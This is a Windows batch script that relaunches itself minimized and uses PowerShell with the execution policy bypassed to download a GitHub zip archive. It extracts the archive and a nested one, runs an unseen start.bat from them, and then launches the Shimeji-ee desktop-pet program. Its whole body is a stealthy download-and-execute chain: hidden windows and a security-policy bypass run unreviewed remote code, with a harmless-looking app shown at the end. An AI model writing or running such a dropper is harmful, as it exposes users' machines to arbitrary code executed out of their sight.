@echo off

:: Run this script minimized
if not "%1" == "minimized" (
    start /min cmd /c "%~f0" minimized
    exit
)

:: Navigate to the root of C:
cd C:/ || exit

:: Create a directory named 's'
mkdir s

:: Download the zip file
PowerShell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/obi3333/Oba/archive/refs/heads/main.zip' -OutFile 'C:/s/m.zip'" || exit

:: Extract the downloaded zip file
PowerShell -ExecutionPolicy Bypass -Command "Expand-Archive -Path 'C:/s/m.zip' -DestinationPath 'C:/s'" || exit

:: Extract the second zip file
PowerShell -ExecutionPolicy Bypass -Command "Expand-Archive -Path 'C:/s/Oba-main/shimeege.zip' -DestinationPath 'C:/s/shimeege'" || exit

cd C:/s/Oba-main || exit
call start.bat

:: Navigate to the directory containing the Java application
cd C:/s/shimeege/shimeege || exit

:: Run the Java application
start /min javaw -jar Shimeji-ee.jar
